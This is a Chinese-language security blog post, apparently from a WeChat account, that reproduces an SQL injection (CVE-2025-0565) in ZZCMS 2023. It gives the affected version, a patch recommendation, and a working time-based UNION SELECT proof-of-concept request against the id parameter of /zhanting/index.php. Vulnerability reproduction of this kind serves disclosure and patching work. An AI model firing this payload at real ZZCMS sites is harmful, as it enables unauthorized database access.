---
cve: "CVE-2025-0565"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【成功复现】ZZCMS系统SQL注入漏洞(CVE-2025-0565)   
原创 弥天安全实验室  弥天安全实验室   2025-06-04 12:04  
  
#   
  
网安引领时代，弥天点亮未来    
   
  
  
  
  
  
   
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x00写在前面**  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x01漏洞介绍**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCwy4Sue7DLsM4sFEnx9msso5gPh3OdnobzIVXZUCUB8a1LU6VCxJK3j0JvjiauTMocsHyfWHfUsKg/640?wx_fmt=png&from=appmsg "")  
  
ZZCMS是中国ZZCMS团队的一套内容管理系统（CMS）。  
ZZCMS是一款功能强大且灵活的内容管理系统，专为企业和个人用户设计，旨在简化网站建设与管理流程。它提供了丰富的模块和插件，支持多种网站类型，如企业官网、电商平台、博客等。  
  
ZZCMS存在注入漏洞，该漏洞源于/index.php页面的id参数包含一个SQL注入漏洞。  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x02影响版本**  
  
  
    
ZZCMS 2023  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCwy4Sue7DLsM4sFEnx9mss5ax6ADddOibViaXAkdfODA1ls2TsWyaib3GzjtF7ytSPNibGvSBv6xJZxw/640?wx_fmt=png&from=appmsg "")  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x03漏洞复现**  
  
1.访问漏洞环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCwy4Sue7DLsM4sFEnx9msskV6YCyXVJu1b0nt64NU75N0CIL2M2MTHAada34tHY3YBNSyzsOPjbg/640?wx_fmt=png&from=appmsg "")  
  
2.对漏洞进行复现  
  
   
**POC**  
  
漏洞复现  
```
GET /zhanting/index.php?id=1'union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,sleep(6)+--+x&skin= HTTP/1.1
Host: 127.0.0.1
```  
  
     通过sleep函数睡眠6秒判断漏洞存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCwy4Sue7DLsM4sFEnx9mssKYOYe8tRx3TmcICLUSMicfUeTcf2e88H6U43rpqqy2TicGKygaUqUwyg/640?wx_fmt=png&from=appmsg "")  
  
  
3.Yakit插件  
测试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCwy4Sue7DLsM4sFEnx9mssLZlQJJicz0tib0mtMpdHh82icgOwrDJ4P3cl7vhR5hLpXKib7zlUjhufxw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x04修复建议**  
  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
  
建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！                       
```
http://bjp.zzcms.net/
https://github.com/En0t5/vul/blob/main/zzcms/zzcsm-sql-inject.md
```  
  
  
  
弥天简介  
  
学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
  
口号 网安引领时代，弥天点亮未来  
  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
   
  
  
知识分享完了  
  
喜欢别忘了关注我们哦~  
  
学海浩茫，  
  
予以风动，  
  
必降弥天之润！  
  
   弥  天  
  
安全实验室  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
